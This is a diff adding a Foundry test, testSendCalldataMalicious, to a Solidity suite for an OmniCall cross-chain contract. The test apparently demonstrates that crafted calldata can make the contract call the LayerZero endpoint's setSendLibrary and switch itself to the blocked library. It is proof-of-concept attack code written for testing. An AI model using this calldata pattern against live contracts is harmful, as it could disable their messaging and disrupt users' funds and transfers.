@@ -8,7 +8,8 @@ pragma solidity 0.8.22;
 //  ==========  External imports    ==========
 
 import { console } from "forge-std/Test.sol";
-import { TestHelperOz5 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
+import { Vm } from "forge-std/Vm.sol";
+import { TestHelperOz5, EndpointV2 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
 
 //  ==========  Internal imports    ==========
 
@@ -149,6 +150,56 @@ contract OmniCallTest is TestHelperOz5 {
         assertEq(srcAddress.balance, INITIAL_BALANCE - fee.nativeFee);
         assertEq(dstAddress.balance, INITIAL_BALANCE);
         assertEq(token.balanceOf(dstAddress), 1);
+    }
+
+    function testSendCalldataMalicious() public {
+        uint128 dstGasLimit = 500_000;
+        uint128 dstMsgValue = 0;
+
+        EndpointV2 dstEndpoint = EndpointV2(endpoints[dstEid]);
+        address blockedLib = dstEndpoint.blockedLibrary();
+
+        MessagingFee memory fee = srcOmniCall.quote(
+            MessageType.ATOMIC,
+            dstEid,
+            Call(
+                address(endpoints[dstEid]),
+                0,
+                abi.encodeWithSignature("setSendLibrary(address,uint32,address)", dstOmniCall, srcEid, blockedLib)
+            ),
+            Transfer(address(0), dstMsgValue),
+            dstGasLimit
+        );
+
+        vm.prank(srcAddress);
+        MessagingReceipt memory receipt = srcOmniCall.send{ value: fee.nativeFee }(
+            MessageType.ATOMIC,
+            dstEid,
+            Call(
+                address(endpoints[dstEid]),
+                0,
+                abi.encodeWithSignature("setSendLibrary(address,uint32,address)", dstOmniCall, srcEid, blockedLib)
+            ),
+            Transfer(dstAddress, dstMsgValue),
+            dstGasLimit
+        );
+        vm.recordLogs();
+        verifyPackets(dstEid, addressToBytes32(address(dstOmniCall)));
+        Vm.Log[] memory entries = vm.getRecordedLogs();
+
+        // Compute the event signature hash.
+        bytes32 expectedSig = keccak256("SendLibrarySet(address,uint32,address)");
+        bool found = false;
+
+        for (uint256 i = 0; i < entries.length; i++) {
+            // Compare the first topic (the event signature) with our expected signature.
+            if (entries[i].topics.length > 0 && entries[i].topics[0] == expectedSig) {
+                // Optionally, further decode topics and data to verify sender, eid, and newLib.
+                found = true;
+                break;
+            }
+        }
+        assertTrue(found);
     }
 
     function testSendCallDataWithNativeTokenSuccess() public {
